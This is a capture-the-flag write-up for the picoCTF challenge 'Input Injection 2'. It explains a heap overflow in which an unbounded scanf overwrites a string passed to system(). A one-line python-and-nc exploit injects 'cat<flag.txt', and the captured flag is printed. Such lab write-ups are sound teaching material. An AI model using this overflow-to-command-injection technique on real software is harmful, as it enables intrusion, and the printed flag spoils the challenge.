# Input Injection 2

**Category:** binary exploitation
**Difficulty:** Medium  
**Progress:** Solved

---

## Description

**Files:** `vuln (binary)`, `vuln.c`


---

## Analysis + Info Dump

#### file + checksec (+ readelf)
```

Arch:     ELF 64-bit LSB executable, x86-64
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
RPATH:    No RPATH
RUNPATH:  No RUNPATH
FORTIFY:  NO (Fortified 0 / Fortifiable 1)
SYMBOLS:  not stripped

```



#### Info Dump
```
two malloc(28) -> heap overflow
program prints username adress and shell adress when run
then prints /bin/pwd to the shell variable on the heap
then uses scanf("%s", username) and print name and shell to stdout
There is no free() in code

scanf() with %s doesn't limit the input length and is thus dangerous


small test on the program reveals, that with big enough input we can override the shell adress

because ww don't override the stack but the heap we can not just generate a pattern and look at $eip
```


### Vulnerability
- Heap-based Buffer Overflow

<!--
### Stack Layout
```
┌──────────────────┐
│  buf[0..31]      │  +0
├──────────────────┤
│  padding         │  +32
├──────────────────┤
│  saved EBX       │  +36
├──────────────────┤
│  saved EBP       │  +40
├──────────────────┤
│  return address  │  +44
└──────────────────┘
```
return adress -> push ebp -> push ebx -> sub 0x24 (36<sub>10</sub>)
padding = 0x24 - 0x20 = 0x04 

---
-->
## Solution


### Step 1:

```
The difference between the username and the shell adress is 0x30 (48<sub>10</sub>)
So we can input 48 padding A's and then our username will write into 'shell'
This will be used as an argument for a system() call and thus executed.
So 48 padding A's and then 'cat flag.txt' should do the trick. 
The problem is 'cat flag.txt' has a space so we need to use a trick: 'cat<flag.txt'
```
### Step 2 — Exploit
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*48 + b"cat<flag.txt" + b"\n")' | nc amiable-citadel.picoctf.net 58132


```

### Step 3 — Capturing the flag

```
picoCTF{us3rn4m3_2_sh3ll_809f901a}
```


<!--
---
## Exploit


-->

---

## Learnings

- `cat<flag.txt` is an awesome way to circumvent space-problems for input
- need to be smart about it. I had all the adresses and couldn't think of executing cat flag.txt for the longest time. 
- heap overflow just means we need to find a variable that is on heap and gets executed to execute whatever we want `/bin/sh` or `cat flag.txt` or other
